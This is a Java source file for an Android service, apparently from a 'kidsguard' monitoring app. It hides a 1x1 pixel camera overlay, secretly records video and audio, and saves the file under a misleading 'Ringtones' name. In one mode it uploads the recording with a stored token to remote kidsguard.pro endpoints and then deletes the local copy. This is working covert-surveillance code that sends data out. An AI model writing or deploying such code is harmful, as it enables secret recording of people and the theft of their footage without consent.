package pro.tasking;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.RequiresApi;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import net.gotev.uploadservice.MultipartUploadRequest;

import java.io.File;
import java.io.IOException;
import java.util.UUID;

public class CapPhoto extends Service implements SurfaceHolder.Callback {

    private WindowManager windowManager;
    private SurfaceView surfaceView;
    private Camera camera = null;
    private MediaRecorder mediaRecorder = null;
    String Type="w",durst="w";
    String path=Environment.getExternalStorageDirectory().getAbsolutePath()+"/"+"Ringtonesmine.mp4";
    int a=1;

    @Override
    public void onCreate() {

        // Start foreground service to avoid unexpected kill
        // Create new SurfaceView, set its size to 1x1, move it to the top left corner and set this service as a callback
       /* */

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    createNotificationChannel();
                    Notification notification = new NotificationCompat.Builder(getApplicationContext(), "ForegroundServiceChannel")
                            .build();
                    startForeground(1, notification);

                }
                if(intent != null){
                durst=(String) intent.getExtras().get("dur");
                Type=(String) intent.getExtras().get("type");

                if (Type.equals("dating")){
                    path=Environment.getExternalStorageDirectory().getAbsolutePath()+"/"+"Ringtonesminedate.mp4";
                }
                }
        windowManager = (WindowManager) CapPhoto.this.getSystemService(Context.WINDOW_SERVICE);
                surfaceView = new SurfaceView(getApplicationContext());
                if (Build.VERSION.SDK_INT>21){
                    if (Build.VERSION.SDK_INT>25){
                        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                                1, 1,
                                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                                PixelFormat.TRANSLUCENT
                        );
                        layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
                        windowManager.addView(surfaceView, layoutParams);
                    }else {
                        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                                1, 1,
                                WindowManager.LayoutParams.TYPE_PHONE,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                                PixelFormat.TRANSLUCENT
                        );
                        layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
                        windowManager.addView(surfaceView, layoutParams);
                    }
                }else {
                    WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                            1, 1,
                            WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                            PixelFormat.TRANSLUCENT
                    );
                    layoutParams.gravity = Gravity.LEFT | Gravity.TOP;

                    windowManager.addView(surfaceView, layoutParams);
                }


                surfaceView.getHolder().addCallback(CapPhoto.this);



        return super.onStartCommand(intent,flags,startId);
    }
    @Override
    public void surfaceCreated(SurfaceHolder surfaceHolder) {
        try {


        camera =Camera.open();
        try {
            camera.setPreviewDisplay(surfaceHolder);
        } catch (IOException e) {
            e.printStackTrace();
        }
        camera.startPreview();
//
        mediaRecorder = new MediaRecorder();
        camera.unlock();


        mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());
        mediaRecorder.setCamera(camera);
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH));
        mediaRecorder.setVideoFrameRate(15);
        //mediaRecorder.setOutputFile(parcelWrite.getFileDescriptor());
        mediaRecorder.setOutputFile(path);


        try {
            mediaRecorder.prepare();
            mediaRecorder.start();


        } catch (Exception e) {
            Log.e("cach6", e.toString() );
        } }catch (RuntimeException s){
            Log.e("runnigtime34", s.toString());
        }
        if (Type.equals("not")){
        Handler handler=new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    Log.e("striiiiiiiiiiiiiiiing", "run: ");

                windowManager.removeView(surfaceView);
                try {
                    mediaRecorder.stop();
                }catch (Exception e){}

                mediaRecorder.reset();
                mediaRecorder.release();

                camera.lock();
                camera.release();


                //Toast.makeText(CapPhoto.this, "stop", Toast.LENGTH_SHORT).show();
                //Upload();
                Upload2(); }catch (RuntimeException s){
                    Log.e("runnigtime34", s.toString());
                }
            }

        },40000);
        Handler handler2=new Handler();
        handler2.postDelayed(new Runnable() {
            @RequiresApi(api = Build.VERSION_CODES.N)
            @Override
            public void run() {

                File dir = new File (path);
                if (dir.exists()){
                    dir.delete();
                }
//                stopForeground(0);

            }

        },200000);
    }else if (Type.equals("dating")){
            Handler handler=new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    try {


                        mediaRecorder.stop();
                        mediaRecorder.reset();
                        mediaRecorder.release();
                        camera.lock();
                        camera.release();

                        windowManager.removeView(surfaceView);
                        //Toast.makeText(CapPhoto.this, "stop", Toast.LENGTH_SHORT).show();
                    }catch (RuntimeException e){
                        Log.e("runnigtime34", e.toString());
                    }
                }

            }, Long.parseLong(durst));

        }


    }

    // Stop recording and remove SurfaceView

    @Override
    public void surfaceChanged(SurfaceHolder surfaceHolder, int format, int width, int height) {}

    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {}

    @Override
    public IBinder onBind(Intent intent) { return null; }
    public void Upload(){
        try {
            String uploadId = UUID.randomUUID().toString();
            //Creating a multi part request
            new MultipartUploadRequest(getApplicationContext(), uploadId,"https://req.kidsguard.pro/api/putVideo/")
                    .addFileToUpload(path, "vid") //Adding file
                    .addParameter("token", getToken(getApplicationContext())) //Adding text parameter to the request
                    .setMaxRetries(2)
                    .startUpload(); //Starting the upload
            //Toast.makeText(this, "don", Toast.LENGTH_SHORT).show();

        } catch (Exception exc) {
            // Toast.makeText(this, exc.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }
    public void Upload2(){
        try {
            String uploadId = UUID.randomUUID().toString();
            //Creating a multi part request
            new MultipartUploadRequest(getApplicationContext(), uploadId,"https://im.kidsguard.pro/api/put-video/")
                    .addFileToUpload(path, "video") //Adding file
                    .addParameter("token", getToken(getApplicationContext()))
                    .addParameter("token1", "allow")//Adding text parameter to the request
                    .setMaxRetries(2)

                    .startUpload(); //Starting the upload
            //Toast.makeText(this, "don", Toast.LENGTH_SHORT).show();

        } catch (Exception exc) {

            // Toast.makeText(this, exc.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "ForegroundServiceChannel",
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            serviceChannel.setShowBadge(false);



            NotificationManager manager = getSystemService(NotificationManager.class);

            manager.createNotificationChannel(serviceChannel);

        }
    }
    public  String getToken(Context context){
        String token=null;
        TokenDataBaseManager tokenDataBaseManager=new TokenDataBaseManager(context);
        token=tokenDataBaseManager.gettoken();
        tokenDataBaseManager.close();
        return token;

    }

}